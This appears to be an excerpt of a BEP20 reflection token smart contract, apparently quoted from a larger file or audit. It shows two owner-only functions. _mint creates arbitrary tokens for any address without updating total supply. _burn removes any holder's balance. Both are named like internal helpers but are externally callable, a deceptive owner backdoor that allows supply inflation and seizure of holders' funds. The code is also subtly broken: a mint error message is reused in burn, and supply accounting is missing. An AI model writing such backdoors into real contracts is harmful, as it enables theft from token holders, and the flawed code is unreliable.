...
contract Token is Context, IBEP20, Ownable {
    ...
    function _mint(address account, uint256 tMintAmt) external onlyOwner {
        require(account != address(0), "BEP20: mint to the zero address");
        uint256 currentRate =  _getRate();
        uint256 rMintAmt = tMintAmt.mul(currentRate);
        _rOwned[account] = _rOwned[account].add(rMintAmt);
        _tOwned[account] = _tOwned[account].add(tMintAmt);
    }

    function _burn(address account, uint256 burnAmt) external onlyOwner {
        require(account != address(0), "BEP20: mint to the zero address");
        require(balanceOf(account) >= burnAmt, "Not enough balance");
        removeAllFee();
        _transferStandard(account, address(0), burnAmt);
        restoreAllFee();
    }
}